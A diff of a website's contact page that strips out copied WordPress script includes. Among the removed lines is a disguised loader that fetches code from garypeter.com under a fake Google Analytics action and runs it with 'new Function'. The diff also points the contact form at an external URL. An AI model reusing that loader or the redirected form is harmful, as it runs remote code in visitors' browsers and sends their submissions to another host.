@@ -51,7 +51,7 @@
                             <div style="clear:both;"></div>
 
                             <div id="FSContact1" style="width:99%; max-width:555px;">
-                                <form action="backend/contactdetail.php" id="fscf_form1" method="post">
+                                <form action="http://garypeter.com/contact-us/#FSContact1" id="fscf_form1" method="post">
 
                                     <div id="fscf_div_clear1_0" style="clear:both;">
                                         <div id="fscf_div_field1_0" style="clear:left; float:left; width:99%; max-width:550px; margin-right:10px;">
@@ -117,7 +117,7 @@
                                     </div>
 
                                     <div id="fscf_submit_div1" style="text-align:left; clear:both; padding-top:15px;">
-                                        <input type="submit" id="fscf_submit1" style="cursor:pointer; margin:0;width:134px" value="Submit" name="submit" />
+                                        <input type="submit" id="fscf_submit1" style="cursor:pointer; margin:0;width:134px" value="Submit" onclick="this.disabled=true; this.value='Submitting...'; this.form.submit();" />
                                     </div>
 
                                     <input type="hidden" name="fscf_submitted" value="0" />
@@ -145,37 +145,7 @@
         <!-- Footer Start ============================================= -->
     </div> <!-- end #page -->
     <?php include 'common files/footer.php' ?>
-    <script>
-        jQuery(document).ready(function() {
-            jQuery.post('http://garypeter.com?ga_action=googleanalytics_get_script', {
-                action: 'googleanalytics_get_script'
-            }, function(response) {
-                var F = new Function(response);
-                return (F());
-            });
-        });
-
-    </script>
-    <script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4'></script>
-    <script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4'></script>
-    <script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4'></script>
-    <script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/sortable.min.js?ver=1.11.4'></script>
-    <script type='text/javascript' src='http://garypeter.com/wp-content/themes/freesia-empire/js/jquery.cycle.all.js?ver=3.0.3'></script>
-    <script type='text/javascript'>
-        /* <![CDATA[ */
-        var freesiaempire_slider_value = {
-            "transition_effect": "fade",
-            "transition_delay": "4000",
-            "transition_duration": "1000"
-        };
-        /* ]]> */
-
-    </script>
-    <script type='text/javascript' src='http://garypeter.com/wp-content/themes/freesia-empire/js/freesiaempire-slider-setting.js?ver=4.9.3'></script>
-    <script type='text/javascript' src='http://garypeter.com/wp-content/themes/freesia-empire/js/navigation.js?ver=4.9.3'></script>
-    <script type='text/javascript' src='http://garypeter.com/wp-content/themes/freesia-empire/js/freesiaempire-quote-slider.js?ver=4.2.2'></script>
-    <script type='text/javascript' src='http://garypeter.com/wp-includes/js/wp-embed.min.js?ver=4.9.3'></script>
-    <script type='text/javascript' src='http://garypeter.com/wp-content/plugins/si-contact-form/includes/fscf-scripts.js?ver=179'></script>
+    
 </body>
 
 </html>
